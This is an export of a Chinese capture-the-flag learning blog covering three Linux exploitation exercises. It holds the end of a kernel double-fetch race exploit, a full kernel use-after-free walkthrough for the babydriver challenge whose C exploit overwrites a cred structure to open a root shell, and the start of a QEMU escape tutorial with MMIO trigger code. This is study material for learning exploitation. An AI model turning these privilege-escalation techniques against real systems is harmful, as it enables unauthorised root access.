<span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd1-------&gt;%d\n&quot;</span>, fd1);</span><br><span class="line">    ioctl(fd1, <span class="number">0x6666</span>, <span class="number">0x0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; 1.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;1.txt&quot;</span>, O_RDWR);</span><br><span class="line">    lseek(fd2, <span class="number">-0x1000</span>, SEEK_END);</span><br><span class="line">    read(fd2, buf, <span class="number">0x1000</span>);</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="type">char</span> *index = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (index == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not found!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flag address ------&gt; &quot;</span>);</span><br><span class="line">        write(<span class="number">1</span>, index, <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    true_flag_address = strtoull(index, &amp;str, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nflag1 true_flag_adddress ----------&gt; %llx\n&quot;</span>, true_flag_address);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> false_flag[] = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    flag_info.length = <span class="number">33</span>;</span><br><span class="line">    flag_info.flag = false_flag;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;tt, <span class="literal">NULL</span>, change_flag, &amp;flag_info);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd1, <span class="number">0x1337</span>, &amp;flag_info);</span><br><span class="line">        flag_info.flag = false_flag;</span><br><span class="line">    &#125;</span><br><span class="line">    over = <span class="number">1</span>;</span><br><span class="line">    pthread_join(tt, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041048928.png" alt="image-20230404104852837"></p>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>[<a href="https://bbs.kanxue.com/thread-262426.htm#msg_header_h2_8">原创]Linux Kernel Pwn_1_Double fetch-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/#_1">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://blog.csdn.net/qq_40827990/article/details/97301141?spm=1001.2014.3001.5502">(47条消息) Linux kernel Exploit 内核漏洞学习(1)-Double Fetch_钞sir的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>kernel-Double Fetch</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 kernel-UAF 的学习总结</title>
    <url>/posts/406ce0e2.html</url>
    <content><![CDATA[<p>终于来到了关于内核的学习，目前打算浅尝一下内核的基础知识和漏洞。之后每个学习的新漏洞都单独写一篇文章，每篇学到的新的前置知识都放到对应的文章中吧，暂时先不做汇总。</p>
<span id="more"></span>

<h3 id="CISCN2017-Pwn-babydriver"><a href="#CISCN2017-Pwn-babydriver" class="headerlink" title="CISCN2017_Pwn_babydriver"></a>CISCN2017_Pwn_babydriver</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>将 <code>rootfs.cpio</code> 文件系统映像解包，因为静态分析需要解包得到的 <code>ko</code> 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hen rootfs.cpio</span><br></pre></td></tr></table></figure>



<p>解包脚本 <code>hen</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> <span class="variable">$1</span>.gz</span><br><span class="line">unar <span class="variable">$1</span>.gz</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> core</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span>.gz <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+]Successful&quot;</span></span><br></pre></td></tr></table></figure>



<p>打包脚本 <code>gen</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span> </span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> ..</span><br></pre></td></tr></table></figure>



<p>使用下面的命令，从 <code>bzImage</code> 文件中提取 <code>vmlinux</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>



<h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gdb vmlinux</span><br></pre></td></tr></table></figure>



<p>下面的命令导入符号表，这个 <code>ko</code> 文件是刚刚解压 <code>rootfs.cpio</code> 得到的，后面这个 <code>0xffffffffc0000000</code> 需要在启动内核后，输入 <code>lsmod</code> 查看驱动的基地址从而得到。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add-symbol-file /home/zikh/Desktop/babydriver/core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>



<p>最后用下面的命令连接，调试程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261609913.png" alt="image-20230326160909064"></p>
<p>设置断点需要用驱动的基地址加上 <code>ida</code> 中的偏移的位置打断点即可，这个基地址仅仅是和 <code>text</code> 段的地址相同，假设你现在想查看 <code>bss</code> 段上的某个变量，那么需要获取到 <code>bss</code> 段的基地址以及变量在 <code>bss</code> 段上的偏移。</p>
<p>假设要查看 <code>0xd90</code> 这个地址装载到内存中的实际地址。首先获取它在 <code>bss</code> 段上的偏移，发现 <code>bss</code> 段基地址为 <code>0xd00</code> 因此这个地址在 <code>bss</code> 段上偏移为 <code>0x90</code> </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270841264.png" alt="image-20230327084110128" style="zoom: 50%;" />



<p>获取 <code>bss</code> 段的基地址 （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270843604.png" alt="image-20230327084300554"></p>
<p>因此 <code>babydevice_t</code> 结构体地址是 <code>0xffffffffc00024d0</code> ，验证如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270853716.png" alt="image-20230327085333674"></p>
<h5 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h5><p>如果攻击者能够修改某个进程中的 <code>cred</code> 结构体中的 <code>gid</code> 和 <code>uid</code> <code>euid</code>等字段为 <code>0</code>，也就是能控制 <code>cred</code> 结构体的话，那么攻击者就获得了 <code>root</code> 权限，如果再开启一个 <code>shell</code> 的话，执行的任何命令也都是拥有 <code>root</code> 权限</p>
<h5 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h5><p><a href="https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar">https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar</a></p>
<p>解压文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf babydriver.tar</span><br></pre></td></tr></table></figure>



<p><code>boot.sh</code> 文件</p>
<p>因为我的虚拟机不支持 <code>kvm</code> ，所以把原本 <code>-enable-kvm</code> 这段代码删了，为了方便之后使用 <code>gdb</code> 进行调试，加上了 <code>-gdb tcp::1234</code> 这段代码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span>  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234</span><br></pre></td></tr></table></figure>

<p>然后运行 <code>boot.sh</code> 启动即可。</p>
<h5 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h5><h6 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261513281.png" alt="image-20230326151320208"></p>
<p>申请了 <code>0x40</code> 的堆空间，并返回申请的内存首地址记录在 <code>babydevice_t</code> 结构体的 <code>device_buf</code> 字段</p>
<p>将 <code>0x40</code> 赋值为 <code>babydevice_t</code> 结构体的 <code>device_buf</code> 字段。需要注意的是 <code>babydevice_t</code> 结构体位于 <code>bss</code> 段上，这个全局变量就会存在被覆盖的可能，也就是说我连续 <code>open</code> 两次，那么第二次申请出来的内存块地址则会覆盖第一次申请的内存块地址。</p>
<h6 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262003083.png" alt="image-20230326200309961" style="zoom: 80%;" />

<p>该函数定义了一个 <code>0x10001</code> 的命令，先将 <code>babydevice_t</code> 结构体中的 <code>device_buf</code> 给释放掉，然后重新申请了一块内存，因为 <code>v3</code> 是 <code>rdx</code> 寄存器所赋值的，也就是 <code>babyioctl</code> 函数的第三个参数，而 <code>v3</code> 又给了 <code>v4</code> ，这个内存大小是我们可控的。</p>
<h6 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262016891.png" alt="image-20230326201609836"></p>
<p>该函数显示检查了 <code>device_buf</code> 是否为空，如果为空的话返回 <code>-1</code> ，如果 <code>device_buf_len</code> 大于 <code>write</code> 函数的第三个参数则将 <code>device_buf</code> 中的数据 <code>copy</code> 到用户区 <code>buffer</code> 空间中</p>
<p>这里 <code>ida</code> 生成的伪代码是有点问题的，正常情况是 <code>copy_to_user(buffer, babydev_struct.device_buf, v4);</code></p>
<h6 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262041836.png" alt="image-20230326204108774"></p>
<p>这个函数和 <code>babywrite</code> 是相反的，将数据从用户区的 <code>buffer</code> 复制到内核中的 <code>device_buf</code> 。</p>
<h6 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262101441.png" alt="image-20230326210113392" style="zoom: 80%;" />

<p>该函数可以将 <code>device_buf</code> 这个堆块给释放掉，但是释放内存后，未将指针置空，产生了 <code>UAF</code> 漏洞。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>连续 <code>open</code> 两次，分配出 <code>fd1</code> 和 <code>fd2</code> ，此时 <code>fd2</code> 将 <code>fd1</code> 的堆块地址覆盖掉了。再使用 <code>ioctl</code> 函数去执行那个 <code>0x10001</code> 的指令，将 <code>fd1</code> 释放掉 （其实释放的是 <code>fd2</code> ），再申请一个 <code>0xa8</code> 的堆块出来（用于伪造 <code>cred</code> 结构体 ），接着再用 <code>release</code> （也就是 <code>close</code> ） 函数将 <code>fd1</code> 释放掉（此时释放的是刚刚申请出来 <code>0xa8 </code>的那个堆块）</p>
<p>调用 <code>fork</code> 函数，创建一个子进程出来，并让父进程 <code>wait</code>。子进程产生时，就需要申请一个 <code>0xa8</code> 的堆块用来当做 <code>cred</code> 结构体，这时就会申请出来刚刚的我们释放掉的堆块。因为最后 <code>release</code> 是对 <code>fd1</code> 操作的，此时 <code>fd2</code> 是依然可以被写入数据的，向 <code>fd2</code> 中写入数据就等同于向子进程刚刚申请 <code>cred</code> 结构体中写入数据。此时父进程中 <code>device_buf</code> 记录的就是刚刚子进程申请堆块的地址。</p>
<p>将其 <code>cred</code> 结构体前 <code>0x28</code> 个字节覆盖成 <code>\x00</code> 执行 <code>system(&quot;/bin/sh&quot;)</code> 即可开启一个 <code>root</code> 权限下的 <code>shell</code> ，也就完成了所谓的内核提权。</p>
<p>上述思路的重点在于，<code>release</code> 操作对一个文件使用后，就无法再用 <code>write</code> 等函数进行该文件的操作了。但 <code>fd1</code> 和 <code>fd2</code> 其实都同时指向了<code>device_buf</code> （无论 <code>device_buf</code> 是哪个堆块地址）。因此用 <code>release</code> 函数释放 <code>fd1</code> 将申请的 <code>0xa8</code> 堆块给 <code>free</code> 掉，通过 <code>write</code> 函数对 <code>fd2</code> 操作依然可以写入数据。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> fd1=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="type">int</span> fd2=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fd1 ---&gt; %d\n&quot;</span>,fd1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fd2 ---&gt; %d\n&quot;</span>,fd2);</span><br><span class="line">	ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">	close(fd1);</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="type">char</span> cred[<span class="number">0xa8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	id=fork();</span><br><span class="line">	<span class="keyword">if</span>(id&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fork error!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(id&gt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(id==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">		write(fd2,cred,<span class="number">0x28</span>);</span><br><span class="line">		<span class="keyword">if</span>(getuid()==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;root user!\n&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;emmmm!\n&quot;</span>);</span><br><span class="line">	close(fd2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262347791.png" alt="image-20230326234748211"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/">kernel UAF - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://blog.csdn.net/qq_40827990/article/details/97272034?spm=1001.2014.3001.5502">(47条消息) kernel pwn – UAF_钞sir的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>kernel-UAF</tag>
      </tags>
  </entry>
  <entry>
    <title>关于qemu逃逸的学习总结</title>
    <url>/posts/fabe43ff.html</url>
    <content><![CDATA[<p>前一段 <code>VNCTF 2023</code> 正好有一道非常入门 <code>qemu</code> 逃逸的题目，正好以此为契机进行 <code>qemu</code> 逃逸的入门学习，在这部分的学习中，要感谢 <strong>winmt</strong> 和 <strong>roderick</strong> 师傅解答我的一些困惑。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="QEMU与逃逸"><a href="#QEMU与逃逸" class="headerlink" title="QEMU与逃逸"></a>QEMU与逃逸</h3><p><code>QEMU</code> 是纯软件实现的虚拟化<strong>模拟器</strong>，可以模拟多种不同的计算机系统和硬件设备。虽然 <code>QEMU</code> 可以模拟出硬件或虚拟环境，但它本质上只是一个程序，所谓 <code>qemu</code> 逃逸是指攻击者利用 <code>QEMU</code> 实现的有漏洞的 <code>PCI</code> 设备来获取主机的权限。从虚拟机中 “逃出来”，其利用方式和平常用户程序执行 <code>system</code> 函数是一样的，只不过平常 <code>PWN</code> 题的触发方式是通过用户的输入进行触发，而 <code>QEMU</code> 虚拟机的设备漏洞通过运行在虚拟机上的用户程序对设备的 <code>IO</code> 交互来间接触发。</p>
<span id="more"></span>



<h3 id="PCI设备"><a href="#PCI设备" class="headerlink" title="PCI设备"></a>PCI设备</h3><p><code>PCI</code> 设备是符合 <code>PCI</code> 总线标准的设备，设备可以申请两类地址空间，分别是 <code>memory space</code> 和 <code>I/O space</code> ，<code>CPU</code> 通过 <code>memory space</code> 访问设备 <code>I/O</code> 的方式称为 <code>memory mapped I/O</code>，也就是 <code>MMIO</code>。通过 <code>I/O space</code> 访问设备 <code>I/O</code> 的方式称为 <code>port mapped I/O</code>，即 <code>PMIO</code>。</p>
<h3 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h3><p><code>MMIO</code> 是指将 <code>I/O</code> 设备的寄存器映射到系统内存地址空间中的一种机制 ，它使用相同的地址总线来处理内存和 <code>I/O</code> 设备，<code>I/O</code> 设备的内存和寄存器被映射到与之相关联的地址。当 <code>CPU</code> 访问某个内存地址时，它可能是物理内存，也可以是某个 <code>I/O</code> 设备的内存，用于访问内存的  <code>CPU</code> 指令也可来访问 <code>I/O</code> 设备。每个 <code>I/O</code> 设备监视 <code>CPU</code> 的地址总线，一旦 <code>CPU</code> 访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳<code> I/O</code>设备，<code>CPU</code> 必须预留给<code>I/O</code> 一个地址区域，该地址区域不能给物理内存使用。</p>
<p>如果能理解上面所说的 <code>MMIO</code> ，那么就不得不提 <code>xxx_mmio_read</code> 和 <code>xxx_mmio_write</code> 这两个函数了（ <code>xxx</code> 是设备名），<code>xxx_mmio_read</code> 函数用于从虚拟设备的 <code>MMIO</code> 地址空间中读取数据，而 <code>xxx_mmio_write</code> 函数则是向指定的 <code>MMIO</code> 地址空间中写入数据。<code>qemu</code> 会监听读写操作，当监听到读写后，就会调用这两个函数。</p>
<h3 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h3><p><code>PMIO</code> 允许CPU通过专用的指令进行输入 输出操作，而不是将I&#x2F;O设备视为内存中的特殊位置,在 <code>PMIO</code> 中，内存和 <code>I/O</code> 设备有各自的地址空间。 端口映射 <code>I/O</code> 通常使用一种特殊的 <code>CPU</code> 指令，专门执行 <code>I/O</code> 操作。在 <code>Intel</code> 的微处理器中，使用的指令是 <code>IN</code> 和 <code>OUT</code>。这些指令可以读&#x2F;写 1,2,4 个字节（例如：outb, outw, outl）到 <code>IO</code> 设备上。<code>I/O</code> 设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在 <code>CPU</code> 物理接口上增加一个 <code>I/O</code> 引脚，要么增加一条专用的 <code>I/O</code> 总线。</p>
<h3 id="什么是QOM？"><a href="#什么是QOM？" class="headerlink" title="什么是QOM？"></a>什么是QOM？</h3><p><code>QOM</code>  <code>（QEMU Object Model）</code> 是 <code>QEMU</code> 的一个核心概念，它是 <code>QEMU</code> 在 <code>C</code> 的基础上自己实现了一套面向对象机制，支持多种体系结构和设备。在 <code>QOM</code> 中，每个设备都被表示为一个对象，对象有一个类型，该类型定义了设备的属性和行为。通过 <code>QOM</code>，开发者可以很方便地添加新的设备和扩展现有设备的功能，从而使 <code>QEMU</code>变得更加强大和灵活。</p>
<h2 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h2><h3 id="escape-langlang-mountain"><a href="#escape-langlang-mountain" class="headerlink" title="escape_langlang_mountain"></a>escape_langlang_mountain</h3><p>题目附件在 <code>buu</code> 的 <code>vnctf 2023</code> 的比赛里就有</p>
<h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><p>作为一名合格的菜鸡，刚开始连咋启动 <code>qemu</code> 都不知道，这里标明一下这俩文件。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251623441.png" alt="image-20230225162320163"></p>
<p>如果有 <code>qemu</code> 的话，那么直接 <code>./launch.sh</code> 就可以启动了。如果没有的话就 <code>sudo apt install qemu-system</code> 安装一下即可，如果还运行不了的话就 <code>ldd</code> 看一下是不是少什么库了，少哪个装哪个就行（具体做法可以参考文末的 <strong>奇奇怪怪的技能</strong> 部分 ）</p>
<p>通过查看 <code>launch.sh</code> 文件我们可以知道设备的名称叫做 <code>vn</code> （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251629467.png" alt="image-20230225162953416"></p>
<p>接下来打开 <code>ida</code> 进行分析，正常的话看到的是多到让人懵逼的代码。</p>
<p>我们的思路是先定位到 <code>vn_class_init</code> 函数，因为去除了符号表，所以这里得根据特征来识别</p>
<p>我这里参考的是 <strong>winmt</strong> 师傅给我推荐的代码  <a href="https://github.com/qemu/qemu/blob/master/hw/misc/edu.c">QEMU educational PCI device</a> ，下面所提到的特征都是根据对比这个模板来进行判断的</p>
<p>我个人认为这个 <code>vn_class_init</code> 一个显著特征就是有如下的 <code>id</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251638167.png" alt="image-20230225163814127"></p>
<p>所以我们搜索 <code>vn_class_init</code> 字符串再结合下面这个特征来寻找 <code>vn_class_init</code> 函数，从而判断出来下面这个函数就是 <code>vn_class_init</code> 函数。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251640026.png" alt="image-20230225164013977"></p>
<p>我们在本地启动 <code>qemu</code> 后，根据 <code>lspci</code> 命令得到的结果（比如出现的 <code>0420</code> 和 <code>1337</code> ）与上面 <code>vn_class_init</code> 函数中的 <code>PCI</code> 信息比较一下得知 <code>vn</code> 这个设备号是 <code>04</code> （这个信息在写脚本的时候会用到）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251642828.png" alt="image-20230225164210745"></p>
<p>而之所以上面那里判断 <code>sub_6d9166</code> 为 <code>pci_vn_realize</code> 是因为模板代码中在 <code>xxx_class_init</code> 函数中这里有将 <code>pci_xxx_realize</code> 的函数地址赋值给结构体的成员变量（这些所谓的特征来判断，都是我自己的猜测，无法保证一定正确）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251754897.png" alt="image-20230225175449806" style="zoom:50%;" />



<p>进入 <code>pci_vn_realize</code> 函数，我们这里可以继续对比模板代码（如下），猜测 <code>sub_54ABB5</code> 函数是 <code>memory_region_init_io</code>  ，原因是这个函数出现了 <code>vn_mmio</code> 这个字符串，并且参数也符合 <code>memory_region_init_io</code> 的特征。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251758656.png" alt="image-20230225175818596"></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251801455.png" alt="image-20230225180116377" style="zoom:50%;" />

<p>而 <code>memory_region_init</code> 函数的第三个参数，是 <code>vn_mmio_ops</code> ，它通常是用于访问 <code>MMIO</code> 寄存器的函数集合，这里面存放了 <code>vn_mmio_read</code> 和 <code>vn_mmio_write</code> 的函数指针（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251807914.png" alt="image-20230225180705872"></p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们再来看 <code>vn_mmio_read</code> 函数代码（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251808609.png" alt="image-20230225180803560" style="zoom:50%;" />

<p>这个代码很短，如果 <code>a2</code> 满足 <code>((a2 &gt;&gt; 20) &amp; 0xF) == 1</code> 和 <code>((a2 &gt;&gt; 16) &amp; 0xF) == 0xF</code> ,那么就可以将字符串 <code>vnctf</code> 复制到 <code>dword_137A358</code> 的地址上。这里很明显是模拟了 <code>mmio_read</code> 函数的功能，即 <code>MMIO</code> 读取数据到 <code>qemu</code> 模拟的内存里，所以最后的 <code>memcpy</code> 函数就是在做这个，而 <code>vnctf</code> 字符串也就是要从 <code>MMIO</code> 里获取的数据。</p>
<p>再看 <code>vn_mmio_write</code> 函数代码（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251820483.png" alt="image-20230225182013429" style="zoom:50%;" />

<p>这里发现了后门函数，如果要触发 <code>system</code> 的话，需要让 <code>a2</code> 为 <code>0x2f0000</code> （简单算一下就行），如果想让 <code>command</code> 为 <code>cat flag</code> 字符串的话，需要让 <code>a2</code> 为 <code>0x100000</code> ，所以这个 <code>vn_mmio_write</code>  要执行两次。</p>
<h4 id="EXP的编写"><a href="#EXP的编写" class="headerlink" title="EXP的编写"></a>EXP的编写</h4><p>上面似乎一切都顺理成章，但我们好像忘记了，如何调用 <code>vn_mmio_read</code> 和 <code>vn_mmio_write</code> 函数并且控制他们的参数？</p>
<p><code>QEMU</code> 实现 <code>MMIO</code> 模拟的其中一个因素就是<strong>监控虚拟机对 <code>MMIO</code> 内存的读写，触发对应的回调函数的执行</strong>。假设我现在对 <code>MMIO</code> 内存进行了读的操作，那么 <code>qemu-system-x86_64</code> 程序中的 <code>vn_mmio_read</code> 回调函数则会被触发，而它的参数，也就是读的 <code>MMIO</code> 地址。</p>
<p>所以我们可以编写一个 <code>C</code> 代码（如下），来对 <code>MMIO</code> 内存进行读的操作（ <code>mmio_mem</code> 是 <code>MMIO</code> 区域的起始地址），之所以这段代码进行了读的操作是因为 <code>return *(mmio_mem + addr)</code> 将 <code>MMIO</code> 区域中的数据读了出来并返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line">mmio_read(<span class="number">0x1f0000</span>);</span><br></pre></td></tr></table></figure>



<p>依次类推 <code>mmio_write</code> 函数是同理，向 <code>MMIO</code> 区域中写入数据，从而触发回调函数 <code>vn_mmio_write</code> ，这里的 <code>value</code> 无所谓，而 <code>addr</code> 则会当做参数传递给 <code>vn_mmio_write</code> </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">  *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line">mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<p>为了获取 <code>MMIO</code> 区域的首地址，我们需要打开其设备的 <code>resource0</code> 文件，使用 <code>mmap</code> 函数将其映射到用户空间上，最终实现了对 <code>MMIO</code> 区域的访问。还记得前面所说的设备号 <code>04</code> 么，接下来 <code>open</code> 的时候需要用到。</p>
